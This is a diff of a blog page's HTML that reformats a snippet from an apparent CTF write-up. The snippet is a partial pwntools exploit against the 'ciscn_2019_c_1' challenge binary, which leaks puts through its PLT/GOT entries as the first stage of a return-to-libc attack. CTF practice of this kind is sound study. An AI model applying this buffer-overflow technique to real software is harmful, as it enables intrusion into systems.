@@ -172,13 +172,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>…</p>
-<p>q=process(“./ciscn_2019_c_1”)<br>elf= ELF(“./ciscn_2019_c_1”)</p>
-<p>puts_plt = elf.plt[‘puts’]<br>puts_got = elf.got[‘puts’]<br>main = elf.symbols[‘_start’]</p>
-<p>print “puts_plt = “,hex(puts_plt)<br>print “puts_got = “,hex(puts_got)<br>print “main = “,hex(main)</p>
-<p>payload=flat([“a”*0xc,puts_plt,main,puts_got])</p>
-<p>q.recv()<br>…</p>
-
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">q=process(&quot;./ciscn_2019_c_1&quot;)</span><br><span class="line">elf= ELF(&quot;./ciscn_2019_c_1&quot;)</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">main = elf.symbols[&#x27;_start&#x27;]</span><br><span class="line"></span><br><span class="line">print &quot;puts_plt = &quot;,hex(puts_plt)</span><br><span class="line">print &quot;puts_got = &quot;,hex(puts_got)</span><br><span class="line">print &quot;main = &quot;,hex(main)</span><br><span class="line"></span><br><span class="line">payload=flat([&quot;a&quot;*0xc,puts_plt,main,puts_got])</span><br><span class="line"></span><br><span class="line">q.recv()</span><br></pre></td></tr></table></figure>
       
 
       
